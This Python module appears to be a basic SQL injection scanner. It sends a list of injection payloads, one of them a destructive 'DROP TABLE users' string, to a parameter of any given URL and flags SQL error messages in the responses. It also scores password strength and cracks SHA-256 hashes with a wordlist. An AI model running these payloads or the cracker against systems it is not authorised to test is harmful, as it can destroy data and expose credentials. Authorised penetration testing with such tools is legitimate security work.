#!/usr/bin/env python3
"""
sqli_tester.py
Vulnerability Testing Module
Contains: SQLiTester (SQL Injection + Password utilities)
"""

import requests
import hashlib
import re


class SQLiTester:
    """Test URLs for SQL Injection vulnerabilities and password strength."""

    # Common SQL injection payloads
    PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "admin'--",
        "1'; DROP TABLE users;--",
        "' OR 'x'='x",
    ]

    # Common SQL error signatures
    ERROR_SIGNATURES = [
        "sql syntax",
        "mysql_fetch",
        "pg_query",
        "sqlite_query",
        "odbc_exec",
        "sqlserver",
        "ora-",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "you have an error in your sql syntax",
        "warning: mysql",
        "fatal error",
    ]

    def __init__(self, timeout=10):
        self.timeout = timeout

    def test(self, url, parameter):
        """
        Test a URL parameter for SQL injection vulnerabilities.
        :param url: Full URL with the parameter (e.g., http://site.com/page.php?id=1)
        :param parameter: Parameter name to test (e.g., "id")
        :return: List of tuples (payload, is_vulnerable, detail)
        """
        results = []
        base_url = url.split("?")[0]
        query_params = self._parse_query(url)

        for payload in self.PAYLOADS:
            test_params = query_params.copy()
            test_params[parameter] = payload

            try:
                response = requests.get(base_url, params=test_params, timeout=self.timeout)
                is_vuln, detail = self._analyze_response(response)
                results.append((payload, is_vuln, detail))
            except requests.RequestException as e:
                results.append((payload, False, f"Request failed: {e}"))

        return results

    def _parse_query(self, url):
        """Extract query parameters from URL."""
        from urllib.parse import parse_qs, urlparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def _analyze_response(self, response):
        """Analyze HTTP response for SQL error indicators."""
        text = response.text.lower()
        for sig in self.ERROR_SIGNATURES:
            if sig.lower() in text:
                return True, f"Error signature detected: '{sig}'"
        # Check for significant content length differences (basic heuristic)
        if len(response.text) > 5000:
            return False, "No SQL error signatures found (large response)"
        return False, "No SQL error signatures found"

    @staticmethod
    def check_password_strength(password):
        """
        Analyze password strength and return SHA-256 hash.
        :param password: Plain text password
        :return: Tuple (strength_label, sha256_hash)
        """
        strength = "Weak"
        score = 0
        if len(password) >= 8:
            score += 1
        if len(password) >= 12:
            score += 1
        if re.search(r"[A-Z]", password):
            score += 1
        if re.search(r"[a-z]", password):
            score += 1
        if re.search(r"[0-9]", password):
            score += 1
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            score += 1

        if score >= 5:
            strength = "Very Strong"
        elif score >= 4:
            strength = "Strong"
        elif score >= 3:
            strength = "Medium"
        elif score >= 2:
            strength = "Weak"
        else:
            strength = "Very Weak"

        hash_val = hashlib.sha256(password.encode()).hexdigest()
        return strength, hash_val

    def brute_force_hash(self, target_hash, wordlist_path):
        """
        Attempt to crack a SHA-256 hash using a dictionary wordlist.
        :param target_hash: SHA-256 hash string to crack
        :param wordlist_path: Path to password wordlist
        :return: Cracked password string or None
        """
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                words = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")

        target_hash = target_hash.lower().strip()
        for word in words:
            if hashlib.sha256(word.encode()).hexdigest() == target_hash:
                return word
        return None
